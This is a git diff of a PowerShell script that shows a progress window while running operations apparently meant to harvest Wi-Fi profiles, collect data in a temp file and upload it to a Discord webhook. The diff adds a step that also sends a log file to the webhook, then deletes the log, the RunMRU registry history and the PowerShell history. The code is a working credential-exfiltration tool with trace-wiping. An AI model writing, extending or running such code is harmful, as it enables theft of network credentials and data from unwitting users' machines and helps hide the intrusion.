@@ -115,13 +115,13 @@ $window.Content = $grid
 $window.Show()
 
 # Define the total number of tasks (replace with the number of main operations)
-$totalSteps = 5  # Adjust this to the number of main operations you want to track
+$totalSteps = 6  # Adjust this to the number of main operations you want to track
 
 # Example operations (replace with your actual code)
 for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
     switch ($step) {
-        3 {
+        4 {
             # Operation 1 - Extract Wi-Fi profiles
             $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
             try {
@@ -231,7 +231,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
             Write-Output "Completed Operation 3 - data saved"
         }
-        4 {
+        3 {
             # Operation 4 - SEND TO DISCORD
 
             $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
@@ -414,6 +414,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                         $currentChunks++
                         Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                     }
+                    Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
                 }
             } else {
                 Write-Host "File not found: $filePath"
@@ -430,11 +431,86 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             # Clear the PowerShell command history
             Clear-History
 
-            $textBlock.Text = "Done Last operation."
+            # $textBlock.Text = "Done Last operation."
     
             # Display a message box indicating completion
             # Add-Type -AssemblyName PresentationFramework
             # [System.Windows.MessageBox]::Show('tree finish!', 'Notification')
+        }
+        6 {
+            #SEND THE LOG FILE
+            # Define the path to the text file using the TEMP environment variable
+            $filePath = "$env:TEMP\Ain1_log.txt"
+    
+            # Check if the file exists
+            if (Test-Path $filePath) {
+                # Read the content of the text file
+                $fileContent = Get-Content -Path $filePath -Raw
+    
+                # Check the length of the file content
+                if ($fileContent.Length -lt 2000) {
+                    # Send the entire content to the Discord webhook
+                    $payload = @{
+                        content = $fileContent
+                    } | ConvertTo-Json
+                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                    $progressBar.Value = 100  # Set progress to complete
+                } else {
+                    # Split the content into chunks of 2000 characters
+                    $chunkSize = 2000
+                    $chunks = [System.Collections.Generic.List[string]]::new()
+    
+                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
+                    }
+
+                    # Calculate total chunks for progress increment
+                    $totalChunks = $chunks.Count
+		            $currentChunks = 1
+    
+                    # Send each chunk to the Discord webhook
+                    foreach ($chunk in $chunks) {
+                        # Create the payload for the webhook
+                        $payload = @{
+                            content = $chunk
+                        } | ConvertTo-Json
+    
+                        # Try to send the content to the Discord webhook
+                        try {
+                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
+                        } catch {
+                            Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
+                        }
+
+                        # Update progress bar value
+                        $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
+                        $textBlock.Text = "Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
+
+                        # Update the window to keep it responsive
+                        [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+
+                        # Increment to the next profile
+                        $currentChunks++
+                        Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+                    }
+                    Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
+                }
+            } else {
+                Write-Host "File not found: $filePath"
+                Add-Type -AssemblyName PresentationFramework
+            [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
+            }
+            $textBlock.Text = "Log sent!"
+
+            Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
+
+            #delete the entire history
+            reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    
+            # Clear the PowerShell command history
+            Clear-History
+            
         }
     }
 
